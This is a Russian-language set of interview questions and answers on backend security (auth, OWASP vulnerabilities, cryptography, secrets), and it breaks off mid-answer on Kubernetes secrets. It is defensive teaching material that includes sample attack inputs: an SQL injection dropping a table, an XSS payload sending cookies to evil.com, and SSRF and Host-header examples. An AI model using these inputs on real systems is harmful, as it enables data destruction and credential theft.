# Безопасность — Вопросы и ответы

Файл содержит вопросы по безопасности backend-приложений: аутентификация/авторизация,
веб-уязвимости (OWASP), криптография, управление секретами, сетевая безопасность,
безопасность контейнеров и Go-специфика.

Уровни сложности:
- ![Static Badge](https://img.shields.io/badge/Middle-yellow) — Middle разработчик
- ![Static Badge](https://img.shields.io/badge/Senior-red) — Senior разработчик

---

# Оглавление

1. [Аутентификация и авторизация](#1-аутентификация-и-авторизация)
2. [Веб-уязвимости (OWASP Top 10)](#2-веб-уязвимости-owasp-top-10)
3. [Криптография](#3-криптография)
4. [Управление секретами](#4-управление-секретами)
5. [Сетевая безопасность](#5-сетевая-безопасность)
6. [Безопасность контейнеров и облака](#6-безопасность-контейнеров-и-облака)
7. [Безопасность в Go](#7-безопасность-в-go)
8. [Security testing и аудит](#8-security-testing-и-аудит)

---

## 1. Аутентификация и авторизация

<details>
<summary><b>Развернуть раздел</b></summary>

---

  - Вопрос №1: [ Чем отличается аутентификация от авторизации? ]

    <details>
      <summary>Ответ</summary>

    * **Аутентификация (Authentication)** — проверка, *кто* вы есть. Логин + пароль, биометрия, OTP, сертификат.
    * **Авторизация (Authorization)** — проверка, *что вам разрешено* делать. RBAC, ABAC, ACL.
    * **Пример:** аутентификация — вход по логину/паролю. Авторизация — проверка, может ли пользователь
      удалить чужой пост (роль admin или owner).
    * Аутентификация предшествует авторизации: сначала устанавливается личность, затем права.

    </details>

  ---

  - Вопрос №2: [ Что такое JWT? Как устроен? В чём его плюсы и минусы? ]

    <details>
      <summary>Ответ</summary>

    * **JWT (JSON Web Token)** — компактный, self-contained токен для передачи утверждений (claims) между сторонами.
    * **Структура:** `header.payload.signature` (base64url-encoded, разделены точками).
      * **Header** — алгоритм подписи (`alg: RS256`, `typ: JWT`).
      * **Payload** — claims: `sub` (subject), `exp` (expiration), `iat` (issued at), `iss` (issuer),
        `aud` (audience), кастомные claims.
      * **Signature** — `HMACSHA256(base64(header) + "." + base64(payload), secret)` или RSA/ECDSA.
    * **Плюсы:**
      * Stateless — серверу не нужно хранить сессию.
      * Self-contained — содержит claims, можно передавать между сервисами.
      * Легко масштабируется (нет общего хранилища сессий).
    * **Минусы:**
      * Невозможно отозвать до истечения `exp` (нужен blacklist или короткий TTL + refresh).
      * Размер — больше, чем session ID.
      * Payload не зашифрован (только подписан) — нельзя класть секреты.
      * При краже токена злоумышленник может действовать до истечения срока.
    * **Best practices:**
      * Короткий TTL для access token (5–15 мин).
      * Refresh token с серверным хранением (можно отозвать).
      * `alg: none` — **никогда** не принимать. Принимать только явно заданные алгоритмы.
      * Хранить в httpOnly cookie или Authorization header, не в localStorage.

    </details>

  ---

  - Вопрос №3: [ Что такое OAuth 2.0? Какие бывают grant types? ]

    <details>
      <summary>Ответ</summary>

    * **OAuth 2.0** — фреймворк делегированной авторизации. Позволяет третьей стороне получить ограниченный
      доступ к ресурсам пользователя без передачи пароля.
    * **Роли:**
      * Resource Owner — пользователь.
      * Client — приложение, запрашивающее доступ.
      * Authorization Server — выдаёт токены.
      * Resource Server — API, защищённый токенами.
    * **Grant types:**
      * **Authorization Code** — основной для web/mobile. Клиент получает code → обменивает на token.
        + PKCE для SPA/mobile.
      * **Client Credentials** — server-to-server (M2M). Клиент = resource owner.
      * **Refresh Token** — обмен старого refresh token на новую пару access + refresh.
      * **Device Code** — для устройств без браузера (Smart TV, IoT).
      * ~~Implicit~~ — устарел (был для SPA). Заменён на Authorization Code + PKCE.
      * ~~Password~~ — устарел (Resource Owner Password Credentials). Небезопасен.
    * **PKCE (Proof Key for Code Exchange):** клиент генерирует `code_verifier` (random), отправляет
      `code_challenge = SHA256(code_verifier)`. При обмене code на token — отправляет `code_verifier`,
      сервер сверяет. Защищает от перехвата code в SPA/mobile.

    </details>

  ---

  - Вопрос №4: [ Что такое OpenID Connect (OIDC)? Чем отличается от OAuth 2.0? ]

    <details>
      <summary>Ответ</summary>

    * **OIDC** — слой идентификации (аутентификации) поверх OAuth 2.0.
    * OAuth 2.0 — *авторизация* (доступ к ресурсам). OIDC — *аутентификация* (кто пользователь).
    * OIDC добавляет:
      * **ID Token** — JWT с информацией о пользователе (`sub`, `email`, `name`, `picture`).
      * **UserInfo endpoint** — получение профиля пользователя по access token.
      * **Discovery** — `.well-known/openid-configuration` для автоконфигурации.
      * Стандартные scopes: `openid`, `profile`, `email`, `address`, `phone`.
    * **Flow:** Authorization Code flow OIDC → client получает `access_token` + `id_token` + опционально
      `refresh_token`.

    </details>

  ---

  - Вопрос №5: [ Session-based vs Token-based аутентификация — в чём разница? ]

    <details>
      <summary>Ответ</summary>

    | Аспект | Session-based | Token-based (JWT) |
    |--------|--------------|-------------------|
    | Хранение состояния | Сервер хранит сессию (Redis, БД) | Stateless, токен self-contained |
    | Идентификатор | Session ID в cookie | JWT в header/cookie |
    | Отзыв | Удалить сессию на сервере | Сложно (blacklist или короткий TTL) |
    | Масштабирование | Нужно shared-хранилище сессий | Легко (stateless) |
    | Размер | Маленький (session ID) | Большой (JWT с claims) |
    | CSRF | Уязвим (нужен CSRF token) | Менее уязвим (если в header) |
    | XSS | Cookie с httpOnly защищена | localStorage уязвим к XSS |
    | SSO | Сложно | Легче (токен передаётся между сервисами) |

    * **Гибридный подход:** JWT access token (короткий TTL) + refresh token в httpOnly cookie с серверным
      хранением — можно отозвать, protected от XSS.

    </details>

  ---

  - Вопрос №6: [ Что такое RBAC, ABAC и ACL? ]

    <details>
      <summary>Ответ</summary>

    * **RBAC (Role-Based Access Control):** права назначаются ролям, пользователи получают роли.
      * Пример: `admin`, `editor`, `viewer`.
      * Иерархический RBAC: `super_admin` > `admin` > `editor` > `viewer`.
      * Плюс: простота. Минус: рост ролей при сложных правилах (role explosion).
    * **ABAC (Attribute-Based Access Control):** права определяются атрибутами субъекта, ресурса, действия
      и контекста (политики).
      * Пример: `user.department == resource.department AND action == 'read' AND time.weekday()`.
      * Плюс: гибкость. Минус: сложность настройки и аудита.
    * **ACL (Access Control List):** список прав для каждого ресурса (кто что может).
      * Пример: файл → `alice:rw, bob:r`.
      * Плюс: точность до ресурса. Минус: не масштабируется для миллионов ресурсов.
    * **ReBAC (Relationship-Based):** права через граф отношений (Google Zanzibar). Пример: `owner(folder,
      user) → can_read(all_files_in_folder)`.

    </details>

  ---

  - Вопрос №7: [ Что такое Passkeys и WebAuthn? ]

    <details>
      <summary>Ответ</summary>

    * **WebAuthn (Web Authentication)** — W3C стандарт для аутентификации по публичному ключу в браузере.
      Часть FIDO2.
    * **Passkeys** — пользовательская обёртка над WebAuthn: синхронизируемые credentials между устройствами
      через iCloud Keychain / Google Password Manager.
    * **Как работает:**
      1. Регистрация: устройство генерирует пару ключей (private хранится в secure enclave / TPM;
         public отправляется на сервер).
      2. Аутентификация: сервер отправляет challenge → устройство подписывает private key → сервер
         проверяет public key.
    * **Плюсы:** фишинг-устойчив (привязан к origin), нет пароля, биометрия для локальной разблокировки.
    * **Минусы:** не все платформы поддерживают; потеря устройства без синхронизации = потеря доступа.

    </details>

  ---

  - Вопрос №8: [ Как защититься от brute force атак на логин? ]

    <details>
      <summary>Ответ</summary>

    * **Rate limiting** — ограничение попыток на IP / account (N попыток в минуту).
    * **Exponential backoff / lockout** — после N неудачных попыток — задержка или временная блокировка.
    * **CAPTCHA** — после нескольких неудачных попыток.
    * **Password policy** — минимальная длина, запрет common passwords (haveibeenpwned API).
    * **2FA / MFA** — второй фактор (TOTP, WebAuthn, SMS — наименее надёжный).
    * **Detection:** аномальные паттерны (разные IP, геолокации, user-agent).
    * **Constant-time comparison** при проверке пароля — чтобы избежать timing-атак.
    * **Bcrypt/Argon2** для хеширования — замедляет перебор offline (если утёкла БД).

    </details>

  ---

  - Вопрос №9: [ Что такое timing attack? Как защититься? ]

    <details>
      <summary>Ответ</summary>

    * **Timing attack** — атака по времени выполнения. Если сравнение строк/байтов делается byte-by-byte с
      ранним возвратом (`==`), то attacker может по времени отклика определить, сколько первых байтов совпали.
    * **Пример:** проверка API-ключа `if apiKey == expectedKey` — `==` в большинстве языков сравнивает
      побайтово и выходит при первом несовпадении.
    * **Защита:**
      * **Constant-time comparison** — `subtle.ConstantTimeCompare(a, b []byte)` в Go (`crypto/subtle`).
      * Для паролей — `bcrypt.CompareHashAndPassword` уже constant-time.
      * HMAC verification — `hmac.Equal` (constant-time).
    * **Go:** `crypto/subtle.ConstantTimeCompare`, `crypto/subtle.ConstantTimeEq`.

    </details>

  ---

  - Вопрос №10: [ Чем отличается hashing от encryption? А от encoding? ]

    <details>
      <summary>Ответ</summary>

    | Свойство | Hashing | Encryption | Encoding |
    |----------|---------|------------|----------|
    | Обратимость | Нет (односторонний) | Да (ключом) | Да (без ключа) |
    | Цель | Целостность, хранение паролей | Конфиденциальность | Представление данных |
    | Ключ | Нет | Да (симметричный/асимметричный) | Нет |
    | Примеры | SHA-256, bcrypt, Argon2 | AES, RSA, ChaCha20 | Base64, URL-encoding, UTF-8 |
    | Одинаковый вход | Одинаковый hash | Разный ciphertext (с IV/nonce) | Одинаковый output |

    * **Hashing** — `data → fixed-size digest`. Необратимо. Для паролей — медленные алгоритмы (bcrypt,
      Argon2).
    * **Encryption** — `data + key → ciphertext`. Обратимо ключом. Симметричное (AES) и асимметричное (RSA).
    * **Encoding** — преобразование формата. **Не безопасность.** Base64 — не шифрование.

    </details>

  ---

</details>

---

## 2. Веб-уязвимости (OWASP Top 10)

<details>
<summary><b>Развернуть раздел</b></summary>

---

  - Вопрос №11: [ Что такое SQL Injection? Как защититься? ]

    <details>
      <summary>Ответ</summary>

    * **SQL Injection** — внедрение SQL-кода через пользовательский ввод. Если запрос строится
      конкатенацией строк, attacker может изменить логику запроса.
    * **Пример:** `query := "SELECT * FROM users WHERE name = '" + name + "'"`
      * Ввод: `'; DROP TABLE users; --`
      * Результат: `SELECT * FROM users WHERE name = ''; DROP TABLE users; --'`
    * **Типы:** Classic (in-band), Blind (boolean/time-based), Out-of-band.
    * **Защита:**
      * **Parameterized queries / prepared statements** — основной способ. В Go: `db.Query("SELECT *
        FROM users WHERE name = $1", name)`.
      * **ORM** — `gorm`, `sqlx` с плейсхолдерами.
      * **Input validation** — whitelist, type checking (только цифры, только буквы).
      * **Least privilege** — БД-пользователь приложения не должен иметь права `DROP`.
      * **WAF** — как дополнительный слой (не основной).

    </details>

  ---

  - Вопрос №12: [ Что такое XSS? Какие бывают типы? Как защититься? ]

    <details>
      <summary>Ответ</summary>

    * **XSS (Cross-Site Scripting)** — внедрение JavaScript-кода в страницу, который выполняется в
      браузере другого пользователя.
    * **Типы:**
      * **Stored (Persistent)** — скрипт сохраняется на сервере (комментарий, профиль) и выполняется у
        всех, кто видит страницу.
      * **Reflected (Non-persistent)** — скрипт в URL/параметре, отражается в ответе. Жертва переходит по
        ссылке.
      * **DOM-based** — скрипт выполняется на клиенте без запроса к серверу (через `innerHTML`,
        `eval`, `document.write`).
    * **Пример:** `<script>fetch('https://evil.com?cookie=' + document.cookie)</script>` в комментарии.
    * **Защита:**
      * **Output encoding / escaping** — экранирование `<`, `>`, `"`, `'`, `&` перед вставкой в HTML.
      * **CSP (Content Security Policy)** — `Content-Security-Policy: default-src 'self'; script-src 'self'`
        → блокирует inline-скрипты и внешние источники.
      * **httpOnly cookies** — JS не может прочитать `document.cookie`.
      * **Input validation** — whitelist разрешённых тегов (например, для WYSIWYG — sanitization
        библиотекой).
      * **Framework protection** — React/Vue экранируют по умолчанию (`{{ }}`), но `dangerouslySetInnerHTML`
        / `v-html` обходят защиту.

    </details>

  ---

  - Вопрос №13: [ Что такое CSRF? Как защититься? ]

    <details>
      <summary>Ответ</summary>

    * **CSRF (Cross-Site Request Forgery)** — атака, при которой жертва (уже залогиненная на сайт A)
      посещает вредоносный сайт B, который от её имени отправляет запрос на сайт A (браузер автоматически
      прикрепляет cookies).
    * **Пример:** `<img src="https://bank.com/transfer?to=hacker&amount=1000">` — браузер отправит GET с
      cookie банка.
    * **Защита:**
      * **CSRF Token** — уникальный токен в форме (или header), который проверяется на сервере. Сайт B не
        может его прочитать (Same-Origin Policy).
      * **SameSite cookies** — `Set-Cookie: session=...; SameSite=Strict` (или `Lax`). `Strict` — cookies
        не отправляются при cross-site запросах. `Lax` — отправляются только для top-level GET-навигации.
      * **Double Submit Cookie** — CSRF-токен в cookie + в header; сервер сравнивает.
      * **Custom header requirement** — `X-Requested-With` (не может быть отправлен cross-site без CORS
        preflight).
    * **Примечание:** если API использует JWT в `Authorization` header (не cookie), CSRF не применим.

    </details>

  ---

  - Вопрос №14: [ Что такое SSRF? Как защититься? ]

    <details>
      <summary>Ответ</summary>

    * **SSRF (Server-Side Request Forgery)** — сервер делает HTTP-запрос по URL, который контролирует
      пользователь. Attacker может заставить сервер обратиться к внутренним ресурсам.
    * **Пример:** приложение делает `http.Get(userURL)` для проверки URL.
      * Ввод: `http://169.254.169.254/latest/meta-data/` (AWS metadata) — получение credentials.
      * Ввод: `http://localhost:6379/` — доступ к внутреннему Redis.
    * **Защита:**
      * **Whitelist разрешённых доменов/IP** — не regex, а точный список.
      * **Запрет private IP-диапазонов** — `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`,
        `169.254.0.0/16` (link-local), `::1`.
      * **DNS rebinding protection** — после DNS-резолва проверить IP, использовать resolved IP для
        запроса (не позволять повторный DNS).
      * **Network policies** — контейнер/под не должен иметь доступ к metadata service.
      * **AWS IMDSv2** — требует session token, не доступен через простой GET.
      * **Disable redirects** — или проверять redirect-URL по тем же правилам.

    </details>

  ---

  - Вопрос №15: [ Что такое clickjacking? Как защититься? ]

    <details>
      <summary>Ответ</summary>

    * **Clickjacking** — атака, при которой вредоносный сайт встраивает целевой сайт в `<iframe>` и
      накладывает прозрачный слой, заставляя пользователя кликнуть по скрытой кнопке.
    * **Пример:** пользователь думает, что кликает "Win a prize", но реально кликает "Delete account" на
      встроенном iframe.
    * **Защита:**
      * **X-Frame-Options** — `DENY` (запрет встраивания), `SAMEORIGIN` (только свой origin).
      * **CSP frame-ancestors** — `Content-Security-Policy: frame-ancestors 'self'` (современная замена
        X-Frame-Options, поддерживает списки).
      * **JavaScript frame-busting** — устаревший метод (ненадёжный).

    </details>

  ---

  - Вопрос №16: [ Что такое insecure deserialization? Чем опасно? ]

    <details>
      <summary>Ответ</summary>

    * **Insecure Deserialization** — десериализация непроверенных данных может привести к RCE (Remote Code
      Execution), injection, privilege escalation.
    * **Пример:** приложение десериализует объект из cookie/тела запроса. В Java/Python/PHP — можно
      создать gadget chain, которая выполнит произвольный код при десериализации.
    * **Go:** менее уязвим — `encoding/json` не вызывает произвольные конструкторы. Но `gob` с
      интерфейсными полями может создать неожиданные типы.
    * **Защита:**
      * Не десериализовать непроверенные данные.
      * Whitelist разрешённых классов/типов.
      * Подписывать serialized data (HMAC) для проверки целостности.
      * Избегать полиморфных десериализаторов в непривилегированных зонах.
      * Monitor и log десериализацию.

    </details>

  ---

  - Вопрос №17: [ Что такое security misconfiguration? Примеры? ]

    <details>
      <summary>Ответ</summary>

    * **Security Misconfiguration** — неправильные настройки безопасности, оставленные по умолчанию или
      забытые.
    * **Примеры:**
      * Default credentials (admin/admin) на проде.
      * Отладочные режимы в проде (`DEBUG=True` в Django, `GIN_MODE=debug`).
      * Лишние HTTP-методы включены (PUT, DELETE, TRACE).
      * Directory listing включён.
      * Отсутствие security headers (HSTS, CSP, X-Content-Type-Options).
      * Незащищённые endpoints (`/actuator`, `/debug/pprof`, `/metrics` без auth).
      * CORS `Access-Control-Allow-Origin: *` с `Allow-Credentials: true`.
      * S3 bucket с public read/write.
      * TLS отключён или принимает старые протоколы (TLS 1.0/1.1).
    * **Защита:**
      * Hardening checklist для каждого компонента.
      * Automated scanning (Trivy, CIS benchmarks).
      * Infrastructure as Code — конфигурация версионирована и проверяется.
      * Регулярный аудит.

    </details>

  ---

  - Вопрос №18: [ Что такое CORS? Как работает? Чем отличается простые запросы от preflight? ]

    <details>
      <summary>Ответ</summary>

    * **CORS (Cross-Origin Resource Sharing)** — механизм, позволяющий серверу указать, какие origin могут
      получать ответы. Это *relaxation* Same-Origin Policy, не уязвимость само по себе.
    * **Simple request** — если метод GET/HEAD/POST и headers ограничены (Accept, Content-Type:
      text/plain, multipart/form-data, application/x-www-form-urlencoded), браузер отправляет запрос
      напрямую. Сервер отвечает с `Access-Control-Allow-Origin`.
    * **Preflight request** — для "непростых" запросов (PUT/DELETE, custom headers, JSON body) браузер
      сначала отправляет `OPTIONS` с:
      * `Origin`
      * `Access-Control-Request-Method`
      * `Access-Control-Request-Headers`
    * Сервер отвечает:
      * `Access-Control-Allow-Origin`
      * `Access-Control-Allow-Methods`
      * `Access-Control-Allow-Headers`
      * `Access-Control-Max-Age` (кэш preflight)
    * **Важно:**
      * `Access-Control-Allow-Origin: *` **нельзя** использовать вместе с
        `Access-Control-Allow-Credentials: true`.
      * Credentials (cookies) отправляются только если `Allow-Credentials: true` и origin указан явно
        (не `*`).
      * CORS защищает от чтения ответа браузером, но **не** предотвращает отправку запроса (сервер всё
        равно его получит).

    </details>

  ---

  - Вопрос №19: [ Что такое HTTP Host Header injection? ]

    <details>
      <summary>Ответ</summary>

    * **Host Header Injection** — если приложение использует `Host` header без валидации для генерации
      ссылок, редиректов, cache keys, password-reset писем.
    * **Пример:** password reset email содержит `https://<Host>/reset?token=...`. Attacker отправляет
      запрос с `Host: evil.com` → жертва получает письмо со ссылкой на `evil.com` → attacker получает token.
    * **Защита:**
      * Валидация `Host` header — whitelist разрешённых доменов.
      * Не использовать `Host` header для генерации ссылок — использовать конфигурационный домен.
      * `X-Forwarded-Host` — тоже валидировать (proxy может проксировать атакованный Host).
      * HSTS — предотвращает манипуляции с протоколом.

    </details>

  ---

  - Вопрос №20: [ Что такое race condition в контексте безопасности? ]

    <details>
      <summary>Ответ</summary>

    * **Race condition (TOCTOU — Time-of-check to time-of-use)** — между проверкой условия и использованием
      результата проходит время, в течение которого состояние может измениться.
    * **Примеры:**
      * **Coupon abuse:** проверка "купон использован?" → использование. Два параллельных запроса проходят
        проверку, оба используют купон.
      * **Balance withdrawal:** проверка баланса → списание. Два параллельных запроса — двойное списание
        при недостатке средств.
      * **File upload:** проверка расширения → сохранение. Между ними — symlink/TOCTOU.
    * **Защита:**
      * **Транзакции с нужным уровнем изоляции** — `SELECT ... FOR UPDATE` (pessimistic) или optimistic
        locking с version.
      * **Idempotency keys** — каждый запрос имеет уникальный ключ, сервер дедуплицирует.
      * **Атомарные операции** — `UPDATE balance SET balance = balance - 100 WHERE balance >= 100` (один
        запрос, проверка и действие вместе).
      * **Распределённые блокировки** (Redlock, etcd) — для межсервисных операций.
      * Go: `sync.Mutex` для in-process, БД-транзакции для persistent state.

    </details>

  ---

</details>

---

## 3. Криптография

<details>
<summary><b>Развернуть раздел</b></summary>

---

  - Вопрос №21: [ Симметричное vs асимметричное шифрование — в чём разница? ]

    <details>
      <summary>Ответ</summary>

    | Свойство | Симметричное | Асимметричное |
    |----------|-------------|---------------|
    | Ключи | Один ключ (shared secret) | Пара: public + private |
    | Скорость | Быстро (AES ~1 ГБ/с) | Медленно (RSA ~1 МБ/с) |
    | Распределение ключей | Проблема — как передать ключ? | Public key можно публиковать |
    | Алгоритмы | AES-256-GCM, ChaCha20-Poly1305 | RSA, ECDSA, Ed25519 |
    | Use case | Шифрование данных, TLS data flow | Key exchange, подписи, сертификаты |

    * **Гибридный подход (TLS):** асимметричное — для key exchange (установка shared secret),
      симметричное — для шифрования данных.
    * **AES-GCM / ChaCha20-Poly1305** — authenticated encryption (конфиденциальность + целостность).
      Никогда не использовать AES-CBC без HMAC.

    </details>

  ---

  - Вопрос №22: [ Что такое хеш-функция? Какие требования к криптографической хеш-функции? ]

    <details>
      <summary>Ответ</summary>

    * **Хеш-функция** — функция, отображающая данные произвольной длины в строку фиксированной длины (digest).
    * **Требования к криптографической хеш-функции:**
      * **Pre-image resistance** — по hash нельзя восстановить input (односторонность).
      * **Second pre-image resistance** — для данного input нельзя найти другой input с тем же hash.
      * **Collision resistance** — нельзя найти два разных input с одинаковым hash.
      * **Avalanche effect** — малейшее изменение input → полностью другой hash.
    * **Алгоритмы:**
      * **SHA-256** — стандарт, 256 бит. Подходит для целостности, подписей.
      * **SHA-3 (Keccak)** — другая структура, устойчив к тем же атакам что и SHA-2.
      * **BLAKE3** — очень быстрый, параллельный.
      * ~~MD5~~ — broken (collisions). ~~SHA-1~~ — broken (collisions, SHAttered).
    * **Для паролей** — не использовать общие хеш-функции (слишком быстрые). Использовать bcrypt, scrypt,
      Argon2.

    </details>

  ---

  - Вопрос №23: [ Как правильно хранить пароли? Что такое salt и pepper? ]

    <details>
      <summary>Ответ</summary>

    * **Никогда** хранить пароли в открытом виде или в base64/MD5/SHA-256.
    * **Hashing алгоритмы для паролей:**
      * **bcrypt** — адаптивная стоимость (work factor). Встроенная salt. Ограничение 72 байта.
      * **Argon2id** — современный стандарт (PHC winner). Параметры: memory, iterations, parallelism.
        Рекомендуется.
      * **scrypt** — memory-hard, альтернатива Argon2.
    * **Salt** — уникальное случайное значение для каждого пароля, добавляемое перед хешированием.
      * Предотвращает rainbow table атаки.
      * Хранится вместе с hash (не секрет).
      * Генерируется через `crypto/rand` (не `math/rand`).
    * **Pepper** — общий секретный ключ, добавляемый к паролю перед хешированием.
      * Хранится отдельно от БД (в KMS, env var, secrets manager).
      * Если БД утекла без pepper — пароли не взломать.
      * Эквивалентен HMAC ключу.
    * **Go:** `golang.org/x/crypto/bcrypt`, `golang.org/x/crypto/argon2`.

    </details>

  ---

  - Вопрос №24: [ Что такое MAC, HMAC и цифровая подпись? ]

    <details>
      <summary>Ответ</summary>

    * **MAC (Message Authentication Code)** — код, обеспечивающий целостность и аутентификацию
      сообщения. Использует симметричный ключ.
      * Пример: `HMAC-SHA256(message, key)`.
      * Получатель с тем же ключом может проверить.
    * **HMAC (Hash-based MAC)** — `HMAC(K, m) = H((K ⊕ opad) || H((K ⊕ ipad) || m))`.
      * Защищает от length-extension attack (в отличие от `H(key || message)`).
    * **Цифровая подпись (Digital Signature)** — аналог MAC на асимметричной криптографии.
      * Отправитель подписывает private key, получатель проверяет public key.
      * Обеспечивает non-repudiation (отправитель не может отрицать подпись).
      * Примеры: RSA-PSS, ECDSA, Ed25519.
    * **Разница:**
      | | MAC / HMAC | Digital Signature |
      |--|-----------|-------------------|
      | Ключи | Симметричный | Асимметричные |
      | Non-repudiation | Нет (оба знают ключ) | Да |

    </details>

  ---

  - Вопрос №25: [ Что такое TLS handshake? Как работает? ]

    <details>
      <summary>Ответ</summary>

    * **TLS (Transport Layer Security)** — протокол, обеспечивающий шифрование, аутентификацию и
      целостность данных между клиентом и сервером.
    * **TLS 1.3 handshake (1-RTT):**
      1. **ClientHello** — клиент отправляет: поддерживаемые cipher suites, random, key share (ECDHE
         public key), SNI (hostname).
      2. **ServerHello** — сервер выбирает cipher suite, отправляет random, key share.
      3. **Encrypted extensions** — сервер отправляет сертификат и подпись (уже зашифрованно).
      4. Обе стороны вычисляют shared secret через ECDHE.
      5. **Finished** — обе стороны отправляют MAC для подтверждения целостности handshake.
    * **TLS 1.2 (2-RTT):** больше раундов, поддерживает RSA key exchange (устаревший, без forward
      secrecy).
    * **Forward Secrecy** — если private key сервера скомпрометирован в будущем, прошлый трафик нельзя
      расшифровать (т.к. session keys генерировались через ECDHE, не через private key).
    * **0-RTT (TLS 1.3):** клиент может отправить данные в первом сообщении (раннее data). Уязвимо к
      replay attacks — использовать только для idempotent запросов.

    </details>

  ---

  - Вопрос №26: [ Что такое certificate pinning? Нужен ли он? ]

    <details>
      <summary>Ответ</summary>

    * **Certificate Pinning** — клиент жёстко зашивает (пинит) ожидаемый сертификат или public key сервера,
      вместо того чтобы доверять CA.
    * **Цель:** защита от MITM с компрометированным CA (attacker получает fake сертификат для вашего
      домена).
    * **Типы пинов:**
      * SPKI (Subject Public Key Info) hash — пинится public key, не сам сертификат.
      * Backup pin — второй пин на случай ротации ключа.
    * **Где используется:**
      * Mobile apps (iOS `TrustKit`, Android `Network Security Config`) — main use case.
      * Браузеры — HPKP (HTTP Public Key Pinning) — **устарел и удалён** (risks: lockout, rogue pin).
    * **Минусы:**
      * Риск lockout — если ключ сменился, а пин не обновлён, пользователи не могут зайти.
      * Сложность ротации ключей.
    * **Вердикт:** для mobile apps — да. Для web — нет (использовать HSTS, CAA, CT logs).

    </details>

  ---

  - Вопрос №27: [ Что такое PKI и цепочка доверия сертификатов? ]

    <details>
      <summary>Ответ</summary>

    * **PKI (Public Key Infrastructure)** — система управления цифровыми сертификатами.
    * **Компоненты:**
      * **CA (Certificate Authority)** — выдаёт и подписывает сертификаты.
      * **RA (Registration Authority)** — проверяет личность заявителя.
      * **CRL / OCSP** — отзыв сертификатов (CRL — список, OCSP — онлайн-проверка).
      * **Certificate Transparency (CT) logs** — публичные логи выданных сертификатов.
    * **Цепочка доверия (Chain of Trust):**
      * Root CA → Intermediate CA → End-entity (сервер).
      * Root CA — self-signed, хранится в ОС/браузере (trust store).
      * Intermediate CA — подписан Root CA, изолирует compromise (Root офлайн).
      * Сервер при handshake отправляет свой сертификат + intermediate(s).
      * Клиент проверяет: каждый сертификат подписан следующим в цепочке, до Root в trust store.
    * **CAA DNS record** — указывает, какой CA имеет право выдавать сертификаты для домена.
    * **Let's Encrypt** — бесплатный CA с автоматической выдачей (ACME protocol).

    </details>

  ---

  - Вопрос №28: [ Что такое mTLS? Когда использовать? ]

    <details>
      <summary>Ответ</summary>

    * **mTLS (Mutual TLS)** — обе стороны (клиент и сервер) предъявляют сертификаты и проверяют друг друга.
    * Обычный TLS: сервер предъявляет сертификат, клиент проверяет. Клиент не аутентифицируется (или
      через пароли/JWT).
    * mTLS: клиент тоже имеет сертификат, подписанный внутренним CA.
    * **Когда использовать:**
      * Service-to-service коммуникация (zero-trust, microservices).
      * API с повышенными требованиями безопасности (banking, healthcare).
      * Замена паролей/API-ключей для M2M.
    * **Плюсы:** криптографическая аутентификация, нет паролей, автоматическая ротация.
    * **Минусы:** сложность управления сертификатами (нужен internal CA, rotation, revocation).
    * **Инструменты:** `cert-manager` (K8s), `step-ca`, `HashiCorp Vault` PKI engine, `SPIFFE/SPIRE`.

    </details>

  ---

</details>

---

## 4. Управление секретами

<details>
<summary><b>Развернуть раздел</b></summary>

---

  - Вопрос №29: [ Почему нельзя хранить секреты в .env файлах на проде? Где хранить? ]

    <details>
      <summary>Ответ</summary>

    * **Проблемы .env на проде:**
      * Нет аудита доступа — кто и когда прочитал файл.
      * Нет ротации — секреты живут вечно.
      * Утёкший Docker image / backup содержит секреты.
      * Нет fine-grained access control — любой с доступом к серверу видит все секреты.
      * Git history — случайно закоммитили `.env`.
    * **Где хранить:**
      * **HashiCorp Vault** — centralized secrets management, dynamic secrets, audit log, leasing.
      * **AWS Secrets Manager / Parameter Store** — managed, интеграция с IAM.
      * **GCP Secret Manager / Azure Key Vault** — аналоги.
      * **Kubernetes Secrets** — базовое хранение, но **не зашифрованы** по умолчанию (нужен
        encryption at rest + external KMS).
      * **Sealed Secrets / SOPS** — gitOps подход: секреты зашифрованы в git, расшифровываются в кластере.
    * **Best practices:**
      * Динамические секреты (Vault генерирует временный credential с TTL).
      * Least privilege — приложение получает только нужные секреты.
      * Ротация — автоматическая, без даунтайма.
      * Audit log — кто, когда, какой секрет прочитал.

    </details>

  ---

  - Вопрос №30: [ Что такое HashiCorp Vault? Как устроен? ]

    <details>
      <summary>Ответ</summary>

    * **Vault** — centralized secrets management system.
    * **Архитектура:**
      * Vault server — единственный доверенный компонент.
      * Storage backend — где хранятся зашифрованные секреты (Consul, Raft, AWS DynamoDB).
      * Auto-unseal — ключ шифрования хранится в KMS (AWS KMS, GCP KMS), не требует ручного unseal.
      * Audit log — все операции логируются.
    * **Auth methods:** AppRole, Kubernetes SA, AWS IAM, LDAP, OIDC, cert.
    * **Secret engines:**
      * **KV** — статические key-value секреты.
      * **Database** — динамические credentials (генерирует БД-пользователя с TTL).
      * **PKI** — выдача сертификатов.
      * **Transit** — encryption as a service (шифрование без отдачи ключа).
      * **AWS / GCP** — динамические cloud credentials.
    * **Lease & TTL:** каждый секрет имеет TTL. При истечении — Vault его отзывает (удаляет БД-пользователя).
    * **Клиент:** приложение аутентифицируется → получает token → читает секреты → token имеет TTL →
      renew.

    </details>

  ---

  - Вопрос №31: [ Что такое dynamic secrets? В чём их преимущество? ]

    <details>
      <summary>Ответ</summary>

    * **Dynamic secrets** — секреты, генерируемые on-demand для конкретного клиента с ограниченным TTL.
    * **Пример (Vault DB engine):**
      1. Приложение запрашивает доступ к БД.
      2. Vault создаёт БД-пользователя `v-token-app-xyz-1234` с правами на нужные таблицы и TTL 1 час.
      3. Приложение получает credentials.
      4. Через час Vault удаляет пользователя.
    * **Преимущества:**
      * Нет long-lived credentials — утёкший секрет живёт максимум TTL.
      * Audit — точно известно, какой клиент и когда получил доступ.
      * No sharing — каждый клиент имеет свой credential.
      * Auto-revocation — не нужно вручную отзывать.
    * **Минусы:**
      * Сложность инфраструктуры (Vault HA, fallback).
      * Приложение должно уметь refresh credentials.
      * Сетевая зависимость от Vault.

    </details>

  ---

  - Вопрос №32: [ Как управлять секретами в Kubernetes? ]

    <details>
      <summary>Ответ</summary>

    * **Kubernetes Secrets** (нативные):
      * Хранятся в etcd. По умолчанию — base64-encoded, **не зашифрованы**.
      * Включить encryption at rest: `EncryptionConfiguration` с KMS provider.
      * Доступ через mounted volume (files) или env vars.
      * RBAC ограничивает, какие pod'ы могут читать секрет.
    * **Sealed Secrets (Bitnami):**
      * GitOps-подход. `kubeseal` шифрует секрет public key → SealedSecret в git.
      * Controller в кластере расшифровывает private key → создаёт обычный Secret.
